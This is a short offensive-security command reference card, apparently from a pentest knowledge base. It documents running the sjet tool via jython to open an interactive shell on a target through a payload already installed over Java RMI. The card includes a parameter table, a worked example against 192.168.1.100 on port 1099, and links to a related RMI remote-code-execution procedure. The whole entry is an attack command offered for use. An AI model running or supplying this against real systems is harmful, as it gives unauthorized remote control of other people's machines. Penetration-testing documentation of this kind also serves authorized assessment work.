---
id: e2b36b3d-18a7-4c81-a1b5-6b7c6f3aa1e2
name: sjet-open-interactive-shell-on-target
type: command
executor: bash
data: jython sjet.py $_TARGET_IP $_TARGET_PORT super_secret shell
output: null
created_at: '2023-04-06T03:56:00.890582+00:00'
updated_at: '2023-04-06T03:56:00.908937+00:00'
platforms:
  - Linux
tags:
  - exploitation
  - rmi
  - shell
verified: true
validated: true
---

# sjet-open-interactive-shell-on-target

## Command

```bash
jython sjet.py $_TARGET_IP $_TARGET_PORT super_secret shell
```

## Description

Opens an interactive shell session on the target using the sjet-installed payload via RMI.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_IP | Target IP | Yes |
| $_TARGET_PORT | RMI port | Yes |
| super_secret | Payload name | Yes |
| shell | Action to open shell | Yes |

## Examples

### Basic Usage

```bash
jython sjet.py 192.168.1.100 1099 super_secret shell
```

## Expected Output

Interactive shell prompt, allowing command input and output in real-time.

## Related

- [[procedures/Exploit-Java-RMI-for-RCE-Using-Sjet-or-Mjet]]
- [[commands/sjet-execute-arbitrary-command-on-target]]
